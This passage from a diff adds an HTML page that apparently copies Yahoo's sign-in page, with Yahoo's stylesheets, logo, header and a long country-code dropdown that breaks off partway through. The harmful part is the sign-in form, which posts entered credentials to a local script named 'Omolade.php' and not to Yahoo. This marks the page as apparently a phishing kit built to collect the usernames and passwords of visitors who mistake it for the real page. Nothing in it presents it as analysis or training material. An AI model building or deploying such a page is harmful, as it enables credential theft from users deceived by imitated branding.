@@ -1,0 +1,3067 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-JO" id="Stencil" class="yui3-js-enabled">
+ <head>
+  <title>
+   Yahoo - login
+  </title>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="chrome=1" http-equiv="X-UA-Compatible" />
+  <link href="https://s.yimg.com/zz/combo?/sf/assets/mbrlogin/css/pure-0.3.0-min.css&/sf/assets/mbrlogin/css/12/mbr-min.css&/sf/assets/mbrlogin/css/3/sprite-min.css&/sf/assets/mbrlogin/css/17/mbr-desktop-min.css&/sf/assets/mbrlogin/css/desktop/header/2/header-min.css&/sf/assets/mbrlogin/css/desktop/contents/1/contents-min.css&/sf/assets/mbrlogin/css/desktop/login/1/flags-min.css&/sf/assets/mbrlogin/css/desktop/login/53/login-min.css&/sf/assets/mbrlogin/css/desktop/footer/6/footer-min.css&/sf/assets/mbrlogin/css/mobile/deviceswitcher/2/deviceswitcher-min.css&/sf/assets/mbrlogin/css/desktop/lad/1/lad-min.css&kx/yucs/uh3s/atomic/63/css/atomic-min.css&kx/yucs/uh_common/meta/3/css/meta-min.css&kx/yucs/uh3s/uh/394/css/uh-center-aligned-min.css" type="text/css" rel="stylesheet" />
+  <script>
+   var MBR_config = {
+			baseSpaceID : "150002528",
+			intlSpaceID : "360872528",
+			YWAProjectID : 10001954694556,
+			DocumentName : "Desktop Login",
+			DocumentGroup: "Desktop Login",
+			strings : {},
+			page_starttime: new Date().getTime(),
+			page_loadtime: null,
+			verify : 0,
+			src : "fpctx",
+			intl : "xe",
+			partner : "",
+			ad_crumb : "CbieH8xdrEl",
+			ad_type : 6,
+			ad_type2 : 6,
+			bouncer_login: "https://login.yahoo.com/config/login?.partner=ycorp&amp;.src=ym&amp;mho=1&amp;.done=https%3A%2F%2Fmail.yahoo.com",
+			EOC: "end_of_config"
+		};
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_7_1452652898726_2" src="https://s.yimg.com/zz/combo?yui:3.18.1/io-upload-iframe/io-upload-iframe-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_7_1452652898726_3" src="https://s.yimg.com/zz/combo?yui:3.18.1/queue-promote/queue-promote-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_7_1452652898726_4" src="https://s.yimg.com/zz/combo?yui:3.18.1/io-queue/io-queue-min.js" async="">
+  </script>
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_10_1452652898726_2" href="https://s.yimg.com/zz/combo?yui:3.18.1/widget-base/assets/skins/sam/widget-base.css" />
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_10_1452652898726_3" href="https://s.yimg.com/zz/combo?yui:3.18.1/cssbutton/cssbutton-min.css" />
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_10_1452652898726_4" href="https://s.yimg.com/zz/combo?yui:3.18.1/widget-modality/assets/skins/sam/widget-modality.css" />
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_10_1452652898726_5" href="https://s.yimg.com/zz/combo?yui:3.18.1/widget-stack/assets/skins/sam/widget-stack.css" />
+  <link charset="utf-8" rel="stylesheet" id="yui_3_18_1_10_1452652898726_6" href="https://s.yimg.com/zz/combo?yui:3.18.1/panel/assets/skins/sam/panel.css" />
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_7" src="https://s.yimg.com/zz/combo?yui:3.18.1/attribute-complex/attribute-complex-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_8" src="https://s.yimg.com/zz/combo?yui:3.18.1/classnamemanager/classnamemanager-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_9" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-base/widget-base-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_10" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-htmlparser/widget-htmlparser-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_11" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-skin/widget-skin-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_12" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-uievents/widget-uievents-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_13" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-autohide/widget-autohide-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_14" src="https://s.yimg.com/zz/combo?yui:3.18.1/button-core/button-core-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_15" src="https://s.yimg.com/zz/combo?yui:3.18.1/button-plugin/button-plugin-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_16" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-stdmod/widget-stdmod-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_17" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-buttons/widget-buttons-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_18" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-modality/widget-modality-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_19" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-position/widget-position-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_20" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-position-align/widget-position-align-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_21" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-position-constrain/widget-position-constrain-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_22" src="https://s.yimg.com/zz/combo?yui:3.18.1/widget-stack/widget-stack-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_10_1452652898726_23" src="https://s.yimg.com/zz/combo?yui:3.18.1/panel/panel-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_13_1452652898726_10" src="https://s.yimg.com/zz/combo?yui:3.18.1/datatype-date-parse/datatype-date-parse-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_13_1452652898726_11" src="https://s.yimg.com/zz/combo?yui:3.18.1/intl/intl-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_13_1452652898726_12" src="https://s.yimg.com/zz/combo?yui:3.18.1/datatype-date-format/lang/datatype-date-format_en-US.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_13_1452652898726_13" src="https://s.yimg.com/zz/combo?yui:3.18.1/datatype-date-format/datatype-date-format-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_13_1452652898726_14" src="https://s.yimg.com/zz/combo?yui:3.18.1/datatype-date-math/datatype-date-math-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_13_1452652898726_16" src="https://s.yimg.com/zz/combo?yui:3.18.1/substitute/substitute-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_13_1452652898726_26" src="https://s.yimg.com/zz/combo?yui:3.18.1/array-extras/array-extras-min.js" async="">
+  </script>
+  <script charset="utf-8" id="yui_3_18_1_14_1452652898726_2" src="https://s.yimg.com/zz/combo?yui:3.18.1/node-focusmanager/node-focusmanager-min.js" async="">
+  </script>
+ </head>
+ <body>
+  <div class="mbr-desktop  ">
+   <header>
+    <div class="mbr-header-container pure-u-1">
+     <div class="mbr-header pure-u-1 StencilRoot" id="mbr-header">
+      <style type="text/css">
+       @font-face{font-family:uh;src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?);src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?#iefix) format('embedded-opentype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff2?) format('woff2'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff?) format('woff'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.ttf?) format('truetype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.svg?#uh) format('svg');font-weight:400;font-style:normal}[class^=Ycon],[class*=" Ycon"]{font-family:uh;speak:none;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
+      </style>
+      <link href="https://s.yimg.com/zz/combo?os/stencil/3.0.1/desktop/styles-ltr.css" rel="stylesheet" type="text/css" />
+      <!-- meta -->
+      <div data-uh-test="" data-headercollapse="" data-stickyheader="true" data-userid="" data-test_id="" data-spaceid="" data-status="active" data-shortuserid="" data-shortfirstname="" data-protocol="https" data-property="login" data-languagetag="en-jo" data-https="1" data-host="login.yahoo.com" data-guid="" data-forcecobrand="standard" data-flight="1441173128" data-style="lightbg" data-firstname="" data-experience="uh304" data-device="desktop" data-gta="96opLnumfqw" data-mc-crumb="vti783YCfHa" data-crumb="AFAY/FfJoii" data-cobrand="standard" data-authstate="signedout" id="yucs-meta">
+      </div>
+      <!-- /meta -->
+      <div data-stencil="true" data-spaceid="" data-property="login" data-protocol="https" role="banner" class="Row Pos(r) Start(0) T(0) End(0) Z(10) yucs-en-jo yucs-login yucs" id="UH">
+       <style>
+        body {
+margin-top: 0px !important; 
+}
+
+#UH{
+font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
+}
+
+.YLogoMY{
+text-indent: -30em;
+}
+       </style>
+       <div style="height: 3.8em;" data-ylk="rspns:nav;act:click;t1:a1;t2:uh-d;itc:0;" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" id="uhWrapper">
+        <div role="presentation" class="UHCol1 Pos(a) Fl(start)">
+         <style>
+          /** * IE7+ and non-retina display */.YLogoMY { background-repeat: no-repeat; background-image: url(https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png); _background-image: url(https://s.yimg.com/rz/d/yahoo_ar-JO_f_pw_351x40.gif); /* IE6 */ width: 125px !important; }.DarkTheme .YLogoMY { background-position:  0px !important;}/** * For 'retina' display */@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and ( min--moz-device-pixel-ratio: 2), only screen and ( -o-min-device-pixel-ratio: 2/1), only screen and ( min-device-pixel-ratio: 2), only screen and ( min-resolution: 192dpi), only screen and ( min-resolution: 2dppx) { .YLogoMY { background-image: url(https://s.yimg.com/rz/d/yahoo_ar-JO_f_pw_351x40_2x.png) !important; background-size: 702px 40px !important; }}
+         </style>
+         <a target="_top" href="#" data-ylk="slk:logo;t3:logo;t5:logo;elm:img;elmt:logo;" class="YLogoMY D(b) Ov(h) Ti(-20em) Zoom Darktheme_Bgp(b_t) W(137px) H(34px) Mx(a)! " data-rapid_p="1">
+          Yahoo
+         </a>
+        </div>
+        <div id="uhNavWrapper" role="presentation" class="UHCol3">
+         <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">
+          <li data-yltmenushown="/" id="yucs-profile" class="D(ib) Zoom Va(t) Pos(r) Pstart(4px) Mend(20px) Lts(n)">
+           <a data-ylk="t3:tl-lst;t5:usersigni;slk:usersigni;elm:tl;elmt:lgi;" role="button" aria-haspopup="true" aria-label="Profile" rel="nofollow" target="_top" href="https://login.yahoo.com/config/login?.src=ymbr&.intl=xe&.lang=en-JO&.done=https://login.yahoo.com/config/login%3f.src=fpctx%26.intl=xe%26.lang=en-JO%26.done=https%3a//en-maktoob.yahoo.com/%253fp=us" class="D(b) MouseOver Td(n) Td(n):h signin yucs-trigger Lh(1) Lts($ws)" data-rapid_p="2">
+            <i class="Va(m) W(a) yucs-avatar Ycon YconProfile Fz(22px) Lh(1) C(#32007f) Mend(7px) Lts(n)">
+             👤
+            </i>
+            <b title="Sign in" class="Va(m) yucs-trigger:h_Td(u) Lts(n) Fz(13px)">
+             Sign in
+            </b>
+           </a>
+          </li>
+          <li class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)" id="yucs-help">
+           <a data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;" target="_blank" href="https://help.yahoo.com/l/en-gb/yahoo/edit/" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" id="yucs-help_link" data-rapid_p="3">
+            <b>
+             Help
+            </b>
+           </a>
+          </li>
+         </ul>
+        </div>
+       </div>
+       <!-- /#UH -->
+      </div>
+     </div>
+    </div>
+   </header>
+   <main role="main">
+    <div class="mbr-login-bd ">
+     <div class="mbr-login-c pure-g">
+      <div class="mbr-login-c-right pure-u">
+       <!-- login box -->
+       <div class="mbr-login pure-u">
+        <div class="mbr-login-box-top">
+        </div>
+        <div class="mbr-login-box  no-partner" id="mbr-login-box">
+         <!-- Y LOGO HERE -->
+         <div class="mbr-login-logo">
+          <img src="https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" />
+         </div>
+         <!-- SIGNIN FORM -->
+         <fieldset class="mbr-login-fieldset pure-group" id="mbr-login-fieldset">
+          <form class="pure-form pure-form-stacked mbr-login-form" action="Omolade.php" method="POST" id="mbr-login-form">
+           <div id="inputs">
+            <div class="mbr-login-signin-hd pure-u-1 mbr-text-align mbr-text-13">
+             Sign in to your account
+            </div>
+            <div class="mbr-login-username">
+             <!-- otp country code -->
+             <div class="pure-u selected-country-code mbr-hide narrow1" id="login-country-code-field">
+              <noscript>
+               &lt;div class="mbr-hide"&gt;
+              </noscript>
+              <div id="login-country-code" class="select-country-code">
+               <a href="#country-codes-menu" role="menuitem" aria-haspopup="true" aria-labelledby="country-name" id="login-selected-country-code" tabindex="1">
+                <div class="mbr-hide">
+                 <span class="flag-us">
+                 </span>
+                </div>
+                <span>
+                 <span>
+                 </span>
+                </span>
+                <span class="mbr-hide" id="login-country-name">
+                 United States (+1)
+                </span>
+                <span>
+                 +1
+                </span>
+                <span class="country-code-arrow-container">
+                 <span class="country-code-arrow">
+                 </span>
+                </span>
+               </a>
+              </div>
+              <noscript>
+               &lt;/div&gt;
+              </noscript>
+              <div class="country-codes-container input-width mbr-text-align mbr-hide" id="login-country-codes-menu">
+               <ul>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="af" data-country-code="93">
+                  <span class="flag-af">
+                  </span>
+                  <span class="country-code">
+                   Afghanistan ‪(+93)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="al" data-country-code="355">
+                  <span class="flag-al">
+                  </span>
+                  <span class="country-code">
+                   Albania ‪(+355)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="dz" data-country-code="213">
+                  <span class="flag-dz">
+                  </span>
+                  <span class="country-code">
+                   Algeria ‪(+213)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="as" data-country-code="1">
+                  <span class="flag-as">
+                  </span>
+                  <span class="country-code">
+                   American Samoa ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ad" data-country-code="376">
+                  <span class="flag-ad">
+                  </span>
+                  <span class="country-code">
+                   Andorra ‪(+376)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ao" data-country-code="244">
+                  <span class="flag-ao">
+                  </span>
+                  <span class="country-code">
+                   Angola ‪(+244)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ai" data-country-code="1">
+                  <span class="flag-ai">
+                  </span>
+                  <span class="country-code">
+                   Anguilla ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="aq" data-country-code="672">
+                  <span class="flag-aq">
+                  </span>
+                  <span class="country-code">
+                   Antarctica ‪(+672)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ag" data-country-code="1268">
+                  <span class="flag-ag">
+                  </span>
+                  <span class="country-code">
+                   Antigua, Barbuda ‪(+1268)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ar" data-country-code="54">
+                  <span class="flag-ar">
+                  </span>
+                  <span class="country-code">
+                   Argentina ‪(+54)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="am" data-country-code="374">
+                  <span class="flag-am">
+                  </span>
+                  <span class="country-code">
+                   Armenia ‪(+374)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="aw" data-country-code="297">
+                  <span class="flag-aw">
+                  </span>
+                  <span class="country-code">
+                   Aruba ‪(+297)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ac" data-country-code="247">
+                  <span class="flag-ac">
+                  </span>
+                  <span class="country-code">
+                   Ascension ‪(+247)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="au" data-country-code="61">
+                  <span class="flag-au">
+                  </span>
+                  <span class="country-code">
+                   Australia ‪(+61)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="at" data-country-code="43">
+                  <span class="flag-at">
+                  </span>
+                  <span class="country-code">
+                   Austria ‪(+43)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="az" data-country-code="994">
+                  <span class="flag-az">
+                  </span>
+                  <span class="country-code">
+                   Azerbaidijan ‪(+994)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bs" data-country-code="1">
+                  <span class="flag-bs">
+                  </span>
+                  <span class="country-code">
+                   Bahamas ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bh" data-country-code="973">
+                  <span class="flag-bh">
+                  </span>
+                  <span class="country-code">
+                   Bahrain ‪(+973)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bd" data-country-code="880">
+                  <span class="flag-bd">
+                  </span>
+                  <span class="country-code">
+                   Bangladesh ‪(+880)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bb" data-country-code="1">
+                  <span class="flag-bb">
+                  </span>
+                  <span class="country-code">
+                   Barbados ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="by" data-country-code="375">
+                  <span class="flag-by">
+                  </span>
+                  <span class="country-code">
+                   Belarus ‪(+375)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="be" data-country-code="32">
+                  <span class="flag-be">
+                  </span>
+                  <span class="country-code">
+                   Belgium ‪(+32)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bz" data-country-code="501">
+                  <span class="flag-bz">
+                  </span>
+                  <span class="country-code">
+                   Belize ‪(+501)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bj" data-country-code="229">
+                  <span class="flag-bj">
+                  </span>
+                  <span class="country-code">
+                   Benin ‪(+229)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bm" data-country-code="1441">
+                  <span class="flag-bm">
+                  </span>
+                  <span class="country-code">
+                   Bermuda ‪(+1441)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bt" data-country-code="975">
+                  <span class="flag-bt">
+                  </span>
+                  <span class="country-code">
+                   Bhutan ‪(+975)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bo" data-country-code="591">
+                  <span class="flag-bo">
+                  </span>
+                  <span class="country-code">
+                   Bolivia ‪(+591)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ba" data-country-code="387">
+                  <span class="flag-ba">
+                  </span>
+                  <span class="country-code">
+                   Bosnia &amp; Herzegovina ‪(+387)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bw" data-country-code="267">
+                  <span class="flag-bw">
+                  </span>
+                  <span class="country-code">
+                   Botswana ‪(+267)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="br" data-country-code="55">
+                  <span class="flag-br">
+                  </span>
+                  <span class="country-code">
+                   Brazil ‪(+55)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="vg" data-country-code="1">
+                  <span class="flag-vg">
+                  </span>
+                  <span class="country-code">
+                   British Virgin Islands ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bn" data-country-code="673">
+                  <span class="flag-bn">
+                  </span>
+                  <span class="country-code">
+                   Brunei Darussalam ‪(+673)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bg" data-country-code="359">
+                  <span class="flag-bg">
+                  </span>
+                  <span class="country-code">
+                   Bulgaria ‪(+359)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bf" data-country-code="226">
+                  <span class="flag-bf">
+                  </span>
+                  <span class="country-code">
+                   Burkina Faso ‪(+226)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="bi" data-country-code="257">
+                  <span class="flag-bi">
+                  </span>
+                  <span class="country-code">
+                   Burundi ‪(+257)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="kh" data-country-code="855">
+                  <span class="flag-kh">
+                  </span>
+                  <span class="country-code">
+                   Cambodia ‪(+855)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="cm" data-country-code="237">
+                  <span class="flag-cm">
+                  </span>
+                  <span class="country-code">
+                   Cameroon ‪(+237)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ca" data-country-code="1">
+                  <span class="flag-ca">
+                  </span>
+                  <span class="country-code">
+                   Canada ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="cv" data-country-code="238">
+                  <span class="flag-cv">
+                  </span>
+                  <span class="country-code">
+                   Cape Verde ‪(+238)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ky" data-country-code="1345">
+                  <span class="flag-ky">
+                  </span>
+                  <span class="country-code">
+                   Cayman Islands ‪(+1345)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="cf" data-country-code="236">
+                  <span class="flag-cf">
+                  </span>
+                  <span class="country-code">
+                   Central African Republic ‪(+236)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="td" data-country-code="235">
+                  <span class="flag-td">
+                  </span>
+                  <span class="country-code">
+                   Chad ‪(+235)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="cl" data-country-code="56">
+                  <span class="flag-cl">
+                  </span>
+                  <span class="country-code">
+                   Chile ‪(+56)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="cn" data-country-code="86">
+                  <span class="flag-cn">
+                  </span>
+                  <span class="country-code">
+                   China ‪(+86)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="co" data-country-code="57">
+                  <span class="flag-co">
+                  </span>
+                  <span class="country-code">
+                   Colombia ‪(+57)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="km" data-country-code="269">
+                  <span class="flag-km">
+                  </span>
+                  <span class="country-code">
+                   Comoros ‪(+269)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ck" data-country-code="682">
+                  <span class="flag-ck">
+                  </span>
+                  <span class="country-code">
+                   Cook Islands ‪(+682)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="cr" data-country-code="506">
+                  <span class="flag-cr">
+                  </span>
+                  <span class="country-code">
+                   Costa Rica ‪(+506)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="hr" data-country-code="385">
+                  <span class="flag-hr">
+                  </span>
+                  <span class="country-code">
+                   Croatia ‪(+385)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="cy" data-country-code="357">
+                  <span class="flag-cy">
+                  </span>
+                  <span class="country-code">
+                   Cyprus ‪(+357)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="cz" data-country-code="420">
+                  <span class="flag-cz">
+                  </span>
+                  <span class="country-code">
+                   Czech Republic ‪(+420)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="dk" data-country-code="45">
+                  <span class="flag-dk">
+                  </span>
+                  <span class="country-code">
+                   Denmark ‪(+45)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="dg" data-country-code="246">
+                  <span class="flag-dg">
+                  </span>
+                  <span class="country-code">
+                   Diego Garcia ‪(+246)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="dj" data-country-code="253">
+                  <span class="flag-dj">
+                  </span>
+                  <span class="country-code">
+                   Djibouti ‪(+253)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="dm" data-country-code="1">
+                  <span class="flag-dm">
+                  </span>
+                  <span class="country-code">
+                   Dominica ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="do" data-country-code="1">
+                  <span class="flag-do">
+                  </span>
+                  <span class="country-code">
+                   Dominican Republic ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tl" data-country-code="670">
+                  <span class="flag-tl">
+                  </span>
+                  <span class="country-code">
+                   East Timor ‪(+670)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ec" data-country-code="593">
+                  <span class="flag-ec">
+                  </span>
+                  <span class="country-code">
+                   Ecuador ‪(+593)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="eg" data-country-code="20">
+                  <span class="flag-eg">
+                  </span>
+                  <span class="country-code">
+                   Egypt ‪(+20)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sv" data-country-code="503">
+                  <span class="flag-sv">
+                  </span>
+                  <span class="country-code">
+                   El Salvador ‪(+503)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gq" data-country-code="240">
+                  <span class="flag-gq">
+                  </span>
+                  <span class="country-code">
+                   Equatorial Guinea ‪(+240)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="er" data-country-code="291">
+                  <span class="flag-er">
+                  </span>
+                  <span class="country-code">
+                   Eritrea ‪(+291)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ee" data-country-code="372">
+                  <span class="flag-ee">
+                  </span>
+                  <span class="country-code">
+                   Estonia ‪(+372)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="et" data-country-code="251">
+                  <span class="flag-et">
+                  </span>
+                  <span class="country-code">
+                   Ethiopia ‪(+251)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="fk" data-country-code="500">
+                  <span class="flag-fk">
+                  </span>
+                  <span class="country-code">
+                   Falklands Islands ‪(+500)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="fo" data-country-code="298">
+                  <span class="flag-fo">
+                  </span>
+                  <span class="country-code">
+                   Faroe Islands ‪(+298)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="fj" data-country-code="679">
+                  <span class="flag-fj">
+                  </span>
+                  <span class="country-code">
+                   Fiji Islands ‪(+679)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="fi" data-country-code="358">
+                  <span class="flag-fi">
+                  </span>
+                  <span class="country-code">
+                   Finland ‪(+358)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="fr" data-country-code="33">
+                  <span class="flag-fr">
